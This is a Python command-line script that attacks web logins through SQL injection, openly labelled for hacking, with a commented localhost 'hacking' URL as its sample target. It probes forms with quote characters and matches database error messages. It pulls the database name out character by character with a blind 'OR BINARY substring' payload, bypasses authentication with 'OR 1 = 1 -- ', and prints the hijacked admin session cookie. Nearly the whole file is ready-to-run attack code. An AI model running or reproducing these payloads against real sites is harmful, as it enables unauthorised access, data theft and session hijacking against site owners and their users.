import requests,sys,re,argparse
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint

#'http://localhost/hacking/login.php'
parser = argparse.ArgumentParser()
parser.add_argument('-d', '--database', type=str, help='hack database with sql injection')
parser.add_argument('-f', '--forms', type=str, help='bypass login website with sql injection')
parser.add_argument('-s', '--scan', type=str, help='scan vulnerability the target')
args = parser.parse_args()
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36"

def get_all_forms(url):
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response):
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated"
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def scan_sql_injection(url):
    for c in "\"'":  
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)   
        res = s.get(new_url)
        if is_vulnerable(res):
           
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            return
    
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":    
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:                 
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":             
                    data[input_tag["name"]] = f"test{c}"
            
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)      
            if is_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", url)
                print("[+] Form:")
                pprint(form_details)
                break

def Main():
    if args.database:
        try:
            url = args.database
            for i in range(1,25):
                for c in range(0x20,0x7f):
                    payload = "'OR BINARY substring(database(), %d, 1) = '%s' -- " %(i,chr(c))
                    data = {'username':payload, 'password':'1', 'login':'login'}
                    res = requests.post(url,data=data)
            
                    if 'Hallo admin!' in res.text:
                        sys.stdout.write(chr(c))
                        sys.stdout.flush()
                        break
                    else:
                        False
        except:
            pass
    
    elif args.forms:
        try:
            session_url = requests.session()
            login_url = args.forms
            req = session_url.get(login_url)
            #match = re.search(r'([a-z,0-9]){32}', req.text)
            payload = """'OR 1 = 1 -- """
            data = {'username':payload,'password':'1','login':'login'}
            login = session_url.post(login_url, data=data)
            cookie = session_url.cookies["PHPSESSID"]
            if "Hallo admin!" in login.text:
                print("-"* 50)
                print("[+] Login success!")
                print(f"[+] Admin cookie: {cookie}")
                print(login.text)
        except:
            pass
        
    elif args.scan:
        try:
            url = args.scan
            scan_sql_injection(url) 
        except:
            pass
                
if __name__ == "__main__":
    Main() 